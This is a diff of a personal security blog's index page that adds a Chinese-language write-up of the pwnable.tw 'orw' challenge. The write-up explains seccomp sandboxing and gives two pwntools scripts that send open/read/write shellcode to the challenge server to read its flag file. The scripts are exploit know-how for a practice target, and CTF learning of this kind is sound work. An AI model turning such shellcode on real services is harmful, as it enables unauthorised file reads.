@@ -114,6 +114,120 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2020/03/21/Writeup-of-pwnable-tw之orw/" >Writeup of pwnable.tw之orw</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-03-21  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+
+		
+        
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+
+	
+
+	</div>
+  <a type="button" href="/2020/03/21/Writeup-of-pwnable-tw之orw/#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>题目显示Only <code>open</code> <code>read</code> <code>write</code> syscall are allowed to use.应该是使用了沙箱，</p>
+<p>后门程序是用不成了，只能使用这三个函数直接读取flag。了</p>
+<p><img src="orw.png"></p>
+<p>使用IDA Pro反汇编程序：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:08048548                 lea     ecx, [esp+4]</span><br><span class="line">.text:0804854C                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:0804854F                 push    dword ptr [ecx-4]</span><br><span class="line">.text:08048552                 push    ebp</span><br><span class="line">.text:08048553                 mov     ebp, esp</span><br><span class="line">.text:08048555                 push    ecx</span><br><span class="line">.text:08048556                 sub     esp, 4</span><br><span class="line">.text:08048559                 call    orw_seccomp</span><br><span class="line">.text:0804855E                 sub     esp, 0Ch</span><br><span class="line">.text:08048561                 push    offset format   ; &quot;Give my your shellcode:&quot;</span><br><span class="line">.text:08048566                 call    _printf</span><br><span class="line">.text:0804856B                 add     esp, 10h</span><br><span class="line">.text:0804856E                 sub     esp, 4</span><br><span class="line">.text:08048571                 push    0C8h            ; nbytes</span><br><span class="line">.text:08048576                 push    offset shellcode ; buf</span><br><span class="line">.text:0804857B                 push    0               ; fd</span><br><span class="line">.text:0804857D                 call    _read</span><br><span class="line">.text:08048582                 add     esp, 10h</span><br><span class="line">.text:08048585                 mov     eax, offset shellcode</span><br><span class="line">.text:0804858A                 call    eax ; shellcode</span><br><span class="line">.text:0804858C                 mov     eax, 0</span><br><span class="line">.text:08048591                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048594                 leave</span><br><span class="line">.text:08048595                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048598                 retn</span><br><span class="line">.text:08048598 ; &#125; // starts at 8048548</span><br><span class="line">.text:08048598 main            endp</span><br></pre></td></tr></table></figure>
+
+<p>可以得出整个程序的执行流程：</p>
+<p>首先，在0x08048559地址处调用了orw_seccomp，那么这东西是干嘛的呢？</p>
+<p><a href="%5Bhttps://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/#seccomp%5D(https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/#seccomp)">sseccomp</a></p>
+<p>short for secure computing mode(<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Seccomp">wiki</a>)是一种限制系统调用的安全机制，可以当沙箱用。在严格模式下只支持<code>exit()</code>，<code>sigreturn()</code>，<code>read()</code>和<code>write()</code>，其他的系统调用都会杀死进程，过滤模式下可以指定允许那些系统调用，规则是bpf，可以使用<a target="_blank" rel="noopener" href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>查看</p>
+<p>在早期使用seccomp是使用prctl系统调用实现的，后来封装成了一个libseccomp库，可以直接使用<code>seccomp_init</code>,<code>seccomp_rule_add</code>,<code>seccomp_load</code>来设置过滤规则，但是我们学习的还是从prctl，这个系统调用是进行进程控制的，这里关注seccomp功能。<br>首先，要使用它需要有<code>CAP_SYS_ADMIN</code>权能，否则就要设置<code>PR_SET_NO_NEW_PRIVS</code>位，若不这样做非root用户使用这个程序时<code>seccomp</code>保护将会失效！设置了<code>PR_SET_NO_NEW_PRIVS</code>位后能保证<code>seccomp</code>对所有用户都能起作用，并且会使子进程即execve后的进程依然受控，意思就是即使执行<code>execve</code>这个系统调用替换了整个binary权限不会变化，而且正如其名它设置以后就不能再改了，即使可以调用<code>ptctl</code>也不能再把它禁用掉。</p>
+<p>然后程序接下来将shellcode读到.bss段的0x804a060地址处，然后接下来直接使用call指令跳转到该处执行。</p>
+<p>直接写shellcode：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>, os = <span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./orw&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="string">&quot;10001&quot;</span>)</span><br><span class="line">ass = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">         xor eax, eax</span></span><br><span class="line"><span class="string">         push eax</span></span><br><span class="line"><span class="string">         push 0x6761</span></span><br><span class="line"><span class="string">         push 0x6c662f77</span></span><br><span class="line"><span class="string">         push 0x726f2f65</span></span><br><span class="line"><span class="string">         push 0x6d6f682f</span></span><br><span class="line"><span class="string">         mov al, 0x05</span></span><br><span class="line"><span class="string">         mov ebx, esp</span></span><br><span class="line"><span class="string">         xor ecx, ecx</span></span><br><span class="line"><span class="string">         int 0x80</span></span><br><span class="line"><span class="string">         sub esp, 0x40</span></span><br><span class="line"><span class="string">         mov ebx, eax</span></span><br><span class="line"><span class="string">         mov al, 0x03</span></span><br><span class="line"><span class="string">         mov ecx, esp</span></span><br><span class="line"><span class="string">         mov dl, 0x40</span></span><br><span class="line"><span class="string">         int 0x80</span></span><br><span class="line"><span class="string">         mov al, 0x04</span></span><br><span class="line"><span class="string">         mov bl, 0x01</span></span><br><span class="line"><span class="string">         mov ecx, esp</span></span><br><span class="line"><span class="string">         mov dl, 0x40</span></span><br><span class="line"><span class="string">         int 0x80</span></span><br><span class="line"><span class="string">      &#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(ass)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">s = p.recv(<span class="number">0x40</span>)</span><br><span class="line"><span class="built_in">print</span> s</span><br></pre></td></tr></table></figure>
+
+<p>后来看到网上有人写的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">myelf = ELF(<span class="string">&quot;./orw&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(myelf.path)</span></span><br><span class="line">io  = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">shellcode += shellcraft.i386.pushstr(<span class="string">&#x27;/home/orw/flag&#x27;</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">&#x27;SYS_open&#x27;</span>,<span class="string">&quot;esp&quot;</span>, <span class="number">0</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">&#x27;SYS_read&#x27;</span>,<span class="string">&quot;eax&quot;</span>, <span class="number">0x0804A0D7</span>,<span class="number">40</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">&#x27;SYS_write&#x27;</span>,<span class="number">1</span>, <span class="number">0x0804A0D7</span>,<span class="number">40</span>).rstrip()</span><br><span class="line"><span class="comment">#print shellcode</span></span><br><span class="line"><span class="comment">#print len(asm(shellcode))</span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(asm(shellcode))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+	
+	</div>
+  <a type="button" href="/2020/03/21/Writeup-of-pwnable-tw之orw/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2020/03/20/Writeup-of-pwnable-tw之start/" >Writeup of pwnable.tw之start</a>
 		</h3>
 		</div>
@@ -349,33 +463,35 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/fuzzing/">fuzzing<span>1</span></a></li>
-		
-			<li><a href="/tags/CPU/">CPU<span>3</span></a></li>
+			<li><a href="/tags/windows内核/">windows内核<span>5</span></a></li>
 		
 			<li><a href="/tags/正则表达式/">正则表达式<span>1</span></a></li>
 		
-			<li><a href="/tags/Android/">Android<span>1</span></a></li>
-		
-			<li><a href="/tags/软件调试/">软件调试<span>1</span></a></li>
-		
-			<li><a href="/tags/unix/">unix<span>2</span></a></li>
+			<li><a href="/tags/CTF/">CTF<span>1</span></a></li>
 		
 			<li><a href="/tags/python/">python<span>2</span></a></li>
 		
-			<li><a href="/tags/漏洞分析/">漏洞分析<span>6</span></a></li>
+			<li><a href="/tags/恶意代码分析/">恶意代码分析<span>1</span></a></li>
 		
-			<li><a href="/tags/windows内核/">windows内核<span>5</span></a></li>
+			<li><a href="/tags/fuzzing/">fuzzing<span>1</span></a></li>
 		
-			<li><a href="/tags/算法与数据结构/">算法与数据结构<span>3</span></a></li>
-		
-			<li><a href="/tags/漏洞研究/">漏洞研究<span>1</span></a></li>
+			<li><a href="/tags/软件调试/">软件调试<span>1</span></a></li>
 		
 			<li><a href="/tags/符号执行/">符号执行<span>1</span></a></li>
 		
-			<li><a href="/tags/CTF/">CTF<span>1</span></a></li>
-		
 			<li><a href="/tags/CTF-Writeup/">CTF,Writeup<span>2</span></a></li>
+		
+			<li><a href="/tags/Android/">Android<span>1</span></a></li>
+		
+			<li><a href="/tags/漏洞研究/">漏洞研究<span>1</span></a></li>
+		
+			<li><a href="/tags/漏洞分析/">漏洞分析<span>6</span></a></li>
+		
+			<li><a href="/tags/unix/">unix<span>2</span></a></li>
+		
+			<li><a href="/tags/算法与数据结构/">算法与数据结构<span>3</span></a></li>
+		
+			<li><a href="/tags/CPU/">CPU<span>3</span></a></li>
 		
 		 
 		</ul>
@@ -387,6 +503,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2021/09/30/一个加密木马的分析/" ><i class="fa fa-file-o"></i>一个加密木马的分析</a>
+      </li>
     
       <li>
         <a href="/2021/09/24/Windows系统调用/" ><i class="fa fa-file-o"></i>Windows系统调用</a>
@@ -402,10 +522,6 @@
     
       <li>
         <a href="/2021/09/07/CVE-2021-3156分析/" ><i class="fa fa-file-o"></i>CVE-2021-3156分析</a>
-      </li>
-    
-      <li>
-        <a href="/2021/09/02/高级IO/" ><i class="fa fa-file-o"></i>高级I/O</a>
       </li>
     
   </ul>
@@ -468,4 +584,5 @@
 
 </body>
    </html>
-html>
+
+   </html>
